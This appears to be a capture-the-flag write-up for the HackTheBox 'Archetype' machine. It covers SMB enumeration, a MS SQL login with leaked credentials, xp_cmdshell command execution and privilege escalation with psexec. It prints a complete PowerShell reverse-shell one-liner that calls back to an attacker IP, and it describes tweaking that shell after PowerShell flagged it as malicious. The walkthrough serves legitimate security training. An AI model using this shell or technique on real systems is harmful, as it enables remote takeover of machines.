# Se screenshots

# Enumeration
### Initial port scan
```
export IP=10.10.10.27
sudo nmap $IP -p- -oA nmap/init-scan -v -Pn --disable-arp-ping
```
![[Pasted image 20210812101703.png]]
### SMB enum
List SMB shares as anonymous user if possible:
![[Pasted image 20210812102240.png]]

And thats really all the enumeration we need for this box.

# Explotation
## SMB exploit
A file is found and accessed as anonymous user under the "backups" share.
![[Pasted image 20210812102529.png]]

If we look inside it theres credentials for a user on the machine 'ARCHETYPE'(sql_svc) and the password. This should be the user that the ms sql server is running as.
## MS SQL Server
I use impackets mssqlient python package to login to the server with credentials from the config file. Install with `pip install impacket`.
![[Pasted image 20210812104027.png]]

mssqlclient.py has built-in command to configure xp_cmdshell.
![[Pasted image 20210812104227.png]]
From here we can run `xp_cmdshell <any command we want>` such as whoami, hostname, ipconfig, netstat to get further information on target.
![[Pasted image 20210812104612.png]]

We can also try to land a reverse shell as the current user to make further explotation easier.

I copied a ps reverse shell from payloadallthethings github page and put it in a file with '.ps1'-extension. 
![[Pasted image 20210812111017.png]]
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell

Make sure to change the ip to your IP and remove the powershell command.
(Use `ip add | grep tun` to get the IP for the ovpn connection)
![[Pasted image 20210812111323.png]]

Make sure you're in the same folder as the shell and start a http server, I used python:
![[Pasted image 20210812111621.png]]

Start a listener at desired port: `nc -lvnp 4242`
Retrieve the shell from your web server via xp_cmdshell/powershell:
![[Pasted image 20210812112237.png]]

Powershell identified the script as malicious content.
![[Pasted image 20210812112200.png]]
After som googling I found out that the problem as this:

I removed the '.path' and then it could run.
![[Pasted image 20210812113031.png]]

Success.
![[Pasted image 20210812112947.png]]

The final shell was:
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.72',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

The user flag is found on the desktop:
![[Pasted image 20210812113233.png]]

## Privilege escalation
Afte looking around for som time as the sql_svc user, I found this file:
![[Pasted image 20210812114201.png]]
The user mounts the share backups as an administrator and the password is saved in clear text in this file.

Since we have admin credentials, psexec will probably work.
![[Pasted image 20210812115140.png]]

The flag is located at the desktop as usual.
![[Pasted image 20210812115121.png]]
# Post exploitation
SAM

SQL server

Alternative shells, nc.exe, python?
